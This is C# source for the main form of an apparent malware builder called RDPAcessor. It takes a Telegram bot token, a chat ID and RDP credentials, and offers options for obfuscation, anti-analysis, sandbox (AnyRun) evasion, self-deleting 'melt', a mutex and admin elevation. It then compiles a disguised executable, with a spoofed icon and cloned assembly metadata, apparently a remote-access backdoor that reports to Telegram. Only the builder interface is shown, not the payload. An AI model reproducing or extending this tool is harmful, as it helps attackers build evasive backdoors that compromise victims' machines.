using RDPAcessor.Algorithms.Compilator;
using RDPAcessor.Algorithms.Utils;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace RDPAcessor
{
    public partial class RMain : Form
    {
        private bool isDragging = false;
        private Point lastCursor;
        private Point lastForm;

        private string AssemblyFile, IconFile;
        public RMain()
        {
            InitializeComponent();
        }

        #region Main events
        private void BuildBtn_Click(object sender, EventArgs e)
        {
            string
                TokenBot = BotToken_Box.Text,
                ChatId = Chatid_Box.Text,
                MutexValue = MutexValue_Box.Text,
                RdpUsername = RdpUsernameBox.Text,
                RdpPassword = RdpPasswordBox.Text;

            bool
                UseObfuscate = ObfuscateChk.Checked,
                UseAntiAnalysis = AntiAnalysisChk.Checked,
                UseAntiAnyRun = AntiAnyRunChk.Checked,
                UseMutex = MutexControlChk.Checked,
                UseMelting = MeltFileChk.Checked,
                UseRunAsAdmin = RunAsAdminChk.Checked;

            if (string.IsNullOrEmpty(TokenBot) || string.IsNullOrEmpty(ChatId) || (UseMutex && string.IsNullOrEmpty(MutexValue))
                || string.IsNullOrEmpty(RdpUsername) || string.IsNullOrEmpty(RdpPassword))
            {
                MessageBox.Show("Fields cannot be empty!", "Builder Informer", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            using (SaveFileDialog save = new SaveFileDialog())
            {
                save.Title = "Save compiled file - b u i l d e r";
                save.Filter = "EXE *.exe(*.exe)|*.exe";

                if (save.ShowDialog() == DialogResult.OK)
                {
                    string result = Compilator.Compiler(save.FileName, TokenBot, ChatId, UseObfuscate,
                        UseAntiAnalysis, UseAntiAnyRun, UseMutex, MutexValue, UseMelting, UseRunAsAdmin,
                        IconFile, AssemblyFile, RdpUsername, RdpPassword);

                    try
                    {
                        if (result.Contains("Compiling successfull!"))
                        {
                            StatusLabel.Text = "Status: Compiling successfully!";
                            
                            MessageBox.Show(result, "Compile result", MessageBoxButtons.OK, MessageBoxIcon.Information);

                            StatusLabel.Text = "Status: Idle!";
                        }
                    }
                    catch (Exception ex)
                    {
                        StatusLabel.Text = "Status: Compiling failed!";
                    
                        MessageBox.Show($"Compiling failed!\n{ex}");
                        
                        StatusLabel.Text = "Status: Idle";
                    }
                }
            }
        }

        #endregion

        #region Form Movements & Cheched Changes

        private void MutexControlChk_CheckedChanged(object sender, EventArgs e)
        {
            if (MutexValue_Box.Enabled)
            {
                MutexValue_Box.Enabled = false; MutexValue_Box.Clear();
            }
            else
            {
                MutexValue_Box.Enabled = true;
            }
        }

        #endregion

        #region Mouse & Form drag and other events
        private void CloseBtn_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void MinimazeBtn_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void RMain_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = true;
                lastCursor = Cursor.Position;
                lastForm = Location;
            }
        }

        private void RMain_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                int deltaX = Cursor.Position.X - lastCursor.X;
                int deltaY = Cursor.Position.Y - lastCursor.Y;
                Location = new Point(lastForm.X + deltaX, lastForm.Y + deltaY);
            }
        }
        private void RMain_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = false;
            }
        }
        #endregion

        #region File Selector & reset events
        private void SelectIconBtn_Click(object sender, EventArgs e)
        {
            string iconDir = Path.Combine(Directory.GetCurrentDirectory(), "Icons");
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Select *.ico file - B u i l d e r";
                open.Filter = "ICO *.ico(*.ico)|*.ico";

                if (Directory.Exists(iconDir))
                {
                    open.InitialDirectory = iconDir;
                }

                if (open.ShowDialog() == DialogResult.OK)
                {
                    IconFile = open.FileName;
                    IconBox.Image = Image.FromFile(open.FileName);
                }
            }
        }

        private void SelectAssemblyChk_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Selcect *.exe file - B U I L D E R";
                open.Filter = "EXE *.exe(*.exe)|*.exe";

                if (open.ShowDialog() == DialogResult.OK)
                {
                    AssemblyFile = Utils.AssemblyClone(open.FileName, Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.meta"));
                    if (AssemblyFile != null)
                    {
                        MessageBox.Show($"Selected assembly file: {Path.GetFileName(AssemblyFile)}");
                    }
                }
            }
        }
        private void ResetBtn_Click(object sender, EventArgs e)
        {
            BotToken_Box.Clear(); Chatid_Box.Clear(); AssemblyFile = null;

            RdpUsernameBox.Clear(); RdpPasswordBox.Clear();

            IconFile = null; IconBox.Image = null;
            
        }

        #endregion

        #region Form Load section

        private void DateTime_Tick(object sender, EventArgs e)
        {
            TimeLabel.Text = Utils.PrintDateInfo();
        }

        private void RandStrGenBtn_Click(object sender, EventArgs e)
        {
            if (MutexValue_Box.Enabled)
            {
                MutexValue_Box.Text = Utils.GenerateRandStr(12);
            }else
            {
                MessageBox.Show("Please enable Mutex option to generate random value!", "Builder Informer",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void RMain_Load(object sender, EventArgs e)
        {
            DateTime.Start();
        }
        #endregion
    }
}
